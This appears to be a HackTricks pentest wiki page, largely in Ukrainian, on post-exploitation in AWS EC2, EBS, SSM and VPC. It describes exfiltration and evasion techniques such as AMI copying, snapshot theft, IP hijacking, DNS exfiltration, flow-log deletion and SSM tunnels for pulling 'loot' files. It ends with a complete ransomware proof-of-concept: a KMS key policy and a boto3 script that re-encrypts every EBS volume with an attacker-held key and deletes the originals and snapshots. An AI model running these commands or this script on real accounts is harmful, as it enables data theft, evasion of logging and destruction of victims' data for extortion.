# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Для додаткової інформації див.:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **duplicates inbound and outbound traffic for EC2 instances within a VPC** без потреби встановлювати щось на самих інстансах. Цей дубльований трафік зазвичай надсилається, наприклад, в систему виявлення мережевих вторгнень (IDS) для аналізу та моніторингу.\
Атакувальник може зловживати цим, щоб перехопити весь трафік і отримати з нього конфіденційну інформацію:

Для додаткової інформації див. цю сторінку:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Інстанси зазвичай містять певну чутливу інформацію. Існують різні способи потрапити всередину (див. [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Однак інший спосіб перевірити, що в ньому міститься — **створити AMI і запустити з нього новий інстанс (навіть у власному акаунті)**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, які зазвичай містять **чутливу інформацію**, тому перевірка їх повинна виявити ці дані.\
Якщо ви знайдете **volume without a snapshot**, ви можете: **Create a snapshot** та виконати наступні дії або просто **mount it in an instance** в межах облікового запису:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

Експортуйте EC2 AMI безпосередньо в S3 за допомогою `CreateStoreImageTask`, щоб отримати raw disk image без шарингу snapshot. Це дозволяє провести повну офлайн-форензіку або крадіжку даних, залишивши мережеві налаштування instance недоторканими.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Attachіть io1/io2 Multi-Attach volume до другого instance і змонтуйте його в режимі read-only, щоб викачати live дані без використання snapshots. Корисно, коли victim volume вже має Multi-Attach, увімкнений в тій самій AZ.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Створіть EC2 Instance Connect Endpoint, авторизуйте ingress та інжектуйте ephemeral SSH keys для доступу до приватних instances через керований тунель. Надає швидкі шляхи латерального переміщення без відкриття public портів.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Перенесіть secondary private IP victim ENI на attacker-controlled ENI, щоб видаватися trusted hosts, allowlisted за IP. Дозволяє обходити внутрішні ACLs або SG правила, прив'язані до конкретних адрес.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Reassociateйте Elastic IP з victim instance на attacker, щоб перехоплювати inbound трафік або ініціювати outbound з'єднання, які виглядають як такі, що походять від trusted public IPs.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Якщо правило security group посилається на customer-managed prefix list, додавання attacker CIDRs до списку тихо розширює доступ по всіх залежних SG правилах без зміни самого SG.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

Створіть gateway або interface VPC endpoints, щоб відновити outbound доступ з ізольованих підмереж. Використання AWS-managed private links обходить відсутні IGW/NAT контролі для ексфільтрації даних.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### VPC Flow Logs Cross-Account Exfiltration

Налаштуйте VPC Flow Logs на attacker-controlled S3 bucket, щоб постійно збирати мережеві метадані (source/destination, ports) поза межами victim account для довгострокової розвідки.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Навіть якщо ви закриєте EC2 так, що трафік не виходить, він все одно може **exfil via DNS**.

- **VPC Flow Logs will not record this**.
- Ви не маєте доступу до AWS DNS logs.
- Вимкніть це, встановивши "enableDnsSupport" в false за допомогою:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Атакувальник може викликати API endpoints облікового запису, який він контролює. Cloudtrail зафіксує ці виклики, і attacker зможе побачити ексфільтровані дані в Cloudtrail logs.

### Open Security Group

Ви можете отримати додатковий доступ до мережевих сервісів, відкривши порти таким чином:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Можна запустити EC2 instance і зареєструвати його для запуску ECS instances, а потім викрасти їхні дані.

Для [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Видалити VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Необхідні дозволи:

- `ssm:StartSession`

Окрім виконання команд, SSM дозволяє тунелювання трафіку, що може бути зловживано для pivot з EC2 інстансів, які не мають мережевого доступу через Security Groups або NACLs.
Один зі сценаріїв, де це корисно — pivoting з [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) до приватного EKS кластеру.

> Щоб розпочати сесію, потрібно встановити SessionManagerPlugin: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. Встановіть SessionManagerPlugin на вашому комп'ютері
2. Увійдіть на Bastion EC2 за допомогою наступної команди:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Отримайте тимчасові облікові дані AWS для Bastion EC2 за допомогою скрипта [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment)
4. Перенесіть облікові дані на вашу машину у файл `$HOME/.aws/credentials` як профіль `[bastion-ec2]`
5. Увійдіть в EKS як Bastion EC2:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. Оновіть поле `server` у файлі `$HOME/.kube/config`, щоб вказувати на `https://localhost`  
7. Створіть тунель SSM таким чином:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. Трафік з інструмента `kubectl` тепер перенаправляється через тунель SSM через Bastion EC2, і ви можете отримати доступ до приватного кластера EKS з вашої машини, запустивши:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Зауважте, що SSL-з’єднання не вдасться встановити, якщо ви не вкажете прапорець `--insecure-skip-tls-verify ` (або його еквівалент у K8s audit tools). Оскільки трафік тунелюється через захищений AWS SSM tunnel, ви захищені від будь-яких MitM-атак.

Нарешті, ця техніка не обмежується атаками на приватні EKS кластери. Ви можете вказувати довільні домени та порти, щоб pivot до будь-якої іншої AWS-служби або власного застосунку.

---

#### Швидке локальне ↔️ віддалене переадресування портів (AWS-StartPortForwardingSession)

Якщо вам потрібно перенаправити **лише один TCP порт з EC2 instance на ваш локальний хост**, ви можете використати документ SSM `AWS-StartPortForwardingSession` (параметр remote host не потрібен):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
The command establishes a bidirectional tunnel between your workstation (`localPortNumber`) and the selected port (`portNumber`) on the instance **без відкриття будь-яких вхідних правил Security-Group**.

Common use cases:

* **File exfiltration**
1. На instance запустіть простий HTTP-сервер, що вказує на директорію, яку ви хочете exfiltrate:

```bash
python3 -m http.server 8000
```

2. З вашої робочої станції завантажте файли через SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **Доступ до внутрішніх веб-додатків (наприклад, Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
Порада: Стисніть і зашифруйте докази перед exfiltrating it, щоб CloudTrail не реєстрував clear-text content:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### Надати доступ до AMI
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Пошук конфіденційної інформації в публічних та приватних AMIs

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel — інструмент, призначений для **пошуку конфіденційної інформації в публічних або приватних Amazon Machine Images (AMIs)**. Він автоматизує процес запуску інстансів із цільових AMIs, монтування їхніх томів і сканування на предмет потенційних секретів або чутливих даних.

### Поділ EBS Snapshot
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

Доказ концепції, подібний до демонстрації Ransomware, показаної в S3 post-exploitation notes. KMS слід перейменувати на RMS (Ransomware Management Service) через те, наскільки легко ним користуватися для шифрування різних сервісів AWS.

Спочатку, з 'attacker' AWS-акаунта, створіть customer managed key у KMS. У цьому прикладі ми просто дозволимо AWS керувати даними ключа для нас, але в реалістичному сценарії malicious actor зберігав би дані ключа поза контролем AWS. Змініть key policy, щоб дозволити будь-якому AWS account Principal використовувати цей ключ. У цій key policy ім'я облікового запису було 'AttackSim', а правило політики, що дозволяє повний доступ, називається 'Outside Encryption'
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Правило політики ключа має містити наступні дозволи, щоб дозволити його використання для шифрування EBS volume:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Тепер, маючи публічно доступний ключ для використання. Ми можемо використати 'victim' акаунт, у якому запущено декілька EC2 instances з підключеними незашифрованими EBS volumes. Саме EBS volumes цього 'victim' акаунта є нашою ціллю для шифрування; ця атака здійснюється за умови компрометації AWS акаунта з високими привілеями.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

Подібно до прикладу з S3 ransomware. Ця атака створить копії підключених EBS volumes за допомогою snapshots, використає публічно доступний ключ з 'attacker' акаунта для шифрування нових EBS volumes, потім від'єднає оригінальні EBS volumes від EC2 instances і видалить їх, а наостанок видалить snapshots, використані для створення нових зашифрованих EBS volumes. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

В результаті в обліковому записі залишаться лише зашифровані EBS volumes.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Також варто зазначити, що скрипт зупинив EC2 instances, щоб від'єднати й видалити оригінальні EBS volumes. Оригінальні незашифровані EBS volumes тепер відсутні.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Далі поверніться до політики ключа в 'attacker' акаунті та видаліть правило політики 'Outside Encryption'.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Зачекайте трохи, щоб нова політика ключа поширилася. Потім поверніться до облікового запису 'victim' і спробуйте прикріпити один із щойно зашифрованих EBS томів. Ви побачите, що том можна прикріпити.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Але коли ви намагаєтесь дійсно запустити EC2 інстанс із зашифрованим EBS томом, він просто збоїть і змінить стан із 'pending' назад на 'stopped' назавжди, оскільки прикріплений EBS том неможливо розшифрувати за допомогою ключа, бо політика ключа більше цього не дозволяє.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Це python-скрипт, який було використано. Він приймає AWS облікові дані для облікового запису 'victim' та загальнодоступне значення AWS ARN для ключа, що буде використано для шифрування. Скрипт створить зашифровані копії УСІХ доступних EBS томів, прикріплених до УСІХ EC2 інстансів у цільовому AWS обліковому записі, потім зупинить кожен EC2 інстанс, від'єднає оригінальні EBS томи, видалить їх і, врешті-решт, видалить усі snapshots, використані під час процесу. У цільовому обліковому записі 'victim' залишаться лише зашифровані EBS томи. ВИКОРИСТОВУЙТЕ ЦЕЙ СКРИПТ ЛИШЕ В ТЕСТОВОМУ СЕРЕДОВИЩІ — ВІН ДЕСТРУКТИВНИЙ І ВИДАЛИТЬ УСІ ОРИГІНАЛЬНІ EBS ТОМИ. Ви можете відновити їх, використавши застосований KMS key і відновити до початкового стану через snapshots, проте хочу попередити, що в кінцевому підсумку це ransomware PoC.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Посилання

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
